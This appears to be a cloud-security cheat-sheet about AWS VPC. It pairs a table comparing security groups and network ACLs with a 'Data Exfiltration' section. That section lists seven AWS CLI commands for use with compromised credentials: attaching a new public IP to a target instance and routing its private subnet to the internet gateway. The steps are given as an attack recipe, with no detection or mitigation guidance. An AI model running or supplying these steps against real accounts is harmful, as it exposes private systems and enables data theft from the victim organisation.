# VPC

## Security Group vs Network ACL

| Feature / Behavior                                    | Security Group                                                                                                    | Network ACL                                                                                                          |
|-------------------------------------------------------|--------------------------------------------------------------------------------------------------------------------|-----------------------------------------------------------------------------------------------------------------------|
| **Level of operation**                                | Instance level                                                                                                     | Subnet level                                                                                                          |
| **Rule types supported**                              | Allow rules only                                                                                                   | Allow and deny rules                                                                                                  |
| **Statefulness**                                      | Stateful – return traffic automatically allowed regardless of rules                                                | Stateless – return traffic must be explicitly allowed by rules                                                        |
| **Rule evaluation**                                   | All rules evaluated before deciding whether to allow traffic                                                       | Rules processed in order starting with the lowest numbered rule                                                       |
| **Application scope**                                 | Applies only if specified during launch or associated with an instance later                                       | Applies automatically to all instances in associated subnets                                                          |
| **Purpose**                                           | Primary instance-level traffic control                                                                             | Additional layer of defense if security group rules are too permissive                                                |

## Data Exfiltration

Prerequisites: AWS Credentials

### 1) Allocate a new public IP Address to the EC2 Instance in the account

AWS CLI or CloudShell

    aws ec2 allocate-address

### 2) Find the ENI (network interface) for the target machine.

    aws ec2 describe-instances > instances.json
    grep eni instances.json

### 3) Attach the public IP to the ENI of the target machine, by associating the AllocationId with the NetworkInterfaceId

    aws ec2 associate-address --network-interface-id eni-NETWORK_INTERFACE_ID --allocation-id eipalloc-ALLOCATION_ID

### 4) Get the IGW ID

    aws ec2 describe-internet-gateways

### 5) Get the route table ID (the one that is for the private network)

    aws ec2 describe-route-tables > route-tables.json

### 6) Add the route to the route table

    aws ec2 create-route --route-table-id rtb-ROUTE_TABLE_ID --destination-cidr-block 0.0.0.0/0 --gateway-id igw-INTERNET_GATEWAY_ID

### 7) Verify that you have added the route

    aws ec2 describe-route-tables
